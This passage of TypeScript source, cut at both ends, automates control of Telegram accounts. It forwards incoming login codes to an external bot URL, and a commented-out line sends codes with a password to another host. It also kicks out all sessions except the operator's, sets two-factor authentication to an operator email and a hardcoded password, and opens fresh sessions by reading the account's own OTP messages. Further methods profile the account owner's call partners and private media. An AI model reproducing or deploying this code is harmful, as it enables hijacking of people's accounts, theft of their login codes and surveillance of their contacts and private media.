});\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (let id of chats) {\n            try {\n                const joinResult = await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: id\n                    })\n                );\n                console.log(\"Left channel :\", id)\n                if (chats.length > 1) {\n                    await sleep(30000);\n                }\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(\"Failed to leave channel :\", errorDetails.message)\n            }\n        }\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: any): boolean {\n        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\n            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\n            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\n            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||\n            auth.appName.toLowerCase().includes(\"hanslnz\") || auth.deviceModel.toLowerCase().includes('windows');\n    }\n\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(chatId: string) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory({\n                justClear: false,\n                peer: chatId,\n                revoke: false,\n            }));\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    // Helper function to handle download with a timeout\n    downloadWithTimeout(promise: Promise<Buffer>, timeout: number) {\n        return Promise.race([\n            promise, // The actual download promise\n            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))\n        ]);\n    }\n\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\n        try {\n            const query = { limit: parseInt(limit.toString()) };\n            if (offset) query['offsetId'] = parseInt(offset.toString());\n\n            const messages = await this.client.getMessages(chatId, query);\n            const mediaMessages = messages.filter(message => {\n                // console.log(message.media?.className)\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\n            });\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\n\n            if (!messages.length) {\n                // If no media messages are returned, we might have reached the end\n                console.log(\"No more media messages found. Reached the end of the chat.\");\n                return { data: [], endOfMessages: true };\n            }\n\n            const data = [];\n\n            for (const message of mediaMessages) {\n                console.log(message.media.className, message.document?.mimeType);\n                let thumbBuffer = null;\n\n                try {\n                    if (message.media instanceof Api.MessageMediaPhoto) {\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n                        console.log(\"messageId image:\", message.id)\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'photo',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                        const sizes = message.document?.thumbs || [1];\n                        console.log(\"messageId video:\", message.id)\n                        // const fileSize = message.document.size;\n\n                        // // Skip overly large files for thumbnail (set threshold as needed)\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\n                        //     continue;\n                        // }\n\n                        // Call downloadWithTimeout with a 5-second timeout\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'video',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n                    }\n                } catch (downloadError) {\n                    if (downloadError.message === 'Download timeout') {\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\n                        console.warn('File reference expired for message. Skipping this media.');\n                        // Skip the expired media, continue processing others\n                    } else {\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\n                    }\n                    data.push({\n                        messageId: message.id,\n                        mediaType: 'photo',\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\n                    });\n\n                    // Skip the message and continue with the next one if there's any error\n                    continue;\n                }\n            }\n            if (!data.length) {\n                data.push({\n                    messageId: messages[messages.length - 1].id,\n                    mediaType: 'photo',\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\n                })\n            }\n            console.log(\"Returning \", data.length);\n\n            // Return the metadata and signal if we reached the end of messages\n            return { data, endOfMessages: false };\n\n        } catch (error) {\n            console.error('Error in getMediaMetadata:', error);\n            if (error.message.includes('FLOOD_WAIT')) {\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\n                // Handle flood wait, retry logic\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\n            }\n\n            throw new Error('Error fetching media metadata');\n        }\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const messages = await this.client.getMessages(chatId, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n\n\n    async forwardMessage(chatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(\"@fuckyoubabie\", { fromPeer: chatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code)\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new 